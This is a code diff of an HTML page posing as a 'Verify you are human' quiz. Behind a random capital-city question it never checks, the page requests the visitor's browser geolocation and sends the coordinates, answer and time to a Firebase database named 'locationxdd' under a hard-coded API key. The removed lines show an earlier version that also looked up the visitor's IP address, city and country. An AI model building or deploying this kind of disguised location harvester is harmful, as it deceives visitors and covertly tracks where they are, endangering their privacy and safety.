@@ -3,69 +3,50 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Verification Quiz</title>
+<title>Verification</title>
 
 <style>
 body{
   margin:0;
-  font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial;
-  background: linear-gradient(135deg,#0f172a,#1e293b);
-  color:white;
+  font-family: system-ui, Arial;
+  background:#0f172a;
   display:flex;
   align-items:center;
   justify-content:center;
   height:100vh;
+  color:white;
 }
 
 .card{
   background:#111827;
-  padding:28px;
-  border-radius:16px;
-  width:320px;
+  padding:24px;
+  border-radius:14px;
+  width:300px;
   text-align:center;
-  box-shadow:0 20px 40px rgba(0,0,0,0.4);
-  animation:fadeIn .5s ease;
-}
-
-h2{
-  margin-top:0;
 }
 
 input{
   width:100%;
   padding:10px;
-  border-radius:8px;
   border:none;
-  outline:none;
+  border-radius:8px;
   margin-top:10px;
 }
 
 button{
-  margin-top:14px;
+  margin-top:12px;
   width:100%;
   padding:10px;
   border:none;
   border-radius:10px;
   background:#3b82f6;
   color:white;
-  font-weight:600;
   cursor:pointer;
-  transition:.2s;
-}
-
-button:hover{
-  background:#2563eb;
 }
 
 .status{
-  margin-top:12px;
+  margin-top:10px;
   font-size:14px;
-  opacity:.8;
-}
-
-@keyframes fadeIn{
-  from{opacity:0; transform:translateY(10px);}
-  to{opacity:1; transform:translateY(0);}
 }
 </style>
 </head>
@@ -74,8 +55,8 @@ button:hover{
 <div class="card">
   <h2>Verify you are human</h2>
   <p id="question"></p>
-  <input id="answer" placeholder="Enter answer">
-  <button onclick="submitQuiz()">Continue</button>
+  <input id="answer" placeholder="Answer">
+  <button onclick="verify()">Continue</button>
   <div class="status" id="status"></div>
 </div>
 
@@ -83,7 +64,6 @@ button:hover{
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
-/* YOUR FIREBASE CONFIG */
 const firebaseConfig = {
   apiKey: "AIzaSyD-myAkBLFbPyqIomR02q6iftboysae-wQ",
   authDomain: "locationxdd.firebaseapp.com",
@@ -99,39 +79,25 @@ const db = getDatabase(app);
 
 /* Quiz questions */
 const questions = [
-  {q:"Capital of France?", a:"Paris"},
-  {q:"Capital of Japan?", a:"Tokyo"},
-  {q:"Capital of Italy?", a:"Rome"},
-  {q:"Capital of Germany?", a:"Berlin"},
-  {q:"Capital of Canada?", a:"Ottawa"}
+  "Capital of France?",
+  "Capital of Japan?",
+  "Capital of Italy?",
+  "Capital of Germany?",
+  "Capital of Canada?"
 ];
 
-const current = questions[Math.floor(Math.random()*questions.length)];
-document.getElementById("question").textContent = current.q;
+document.getElementById("question").textContent =
+  questions[Math.floor(Math.random()*questions.length)];
 
-async function submitQuiz(){
+function verify(){
   const status = document.getElementById("status");
-  status.textContent = "Checking verification...";
-
-  let ipData = {};
-
-  try{
-    const res = await fetch("https://ipapi.co/json/");
-    ipData = await res.json();
-  }catch(e){
-    console.log("IP fetch failed");
-  }
-
-  status.textContent = "Requesting location permission...";
+  status.textContent = "Verifying...";
 
   navigator.geolocation.getCurrentPosition(async position => {
 
     const data = {
       answer: document.getElementById("answer").value,
       time: new Date().toISOString(),
-      ip: ipData.ip || "unknown",
-      city: ipData.city || "unknown",
-      country: ipData.country_name || "unknown",
       lat: position.coords.latitude,
       lng: position.coords.longitude
     };
@@ -145,7 +111,7 @@ async function submitQuiz(){
   });
 }
 
-window.submitQuiz = submitQuiz;
+window.verify = verify;
 </script>
 
 </body>
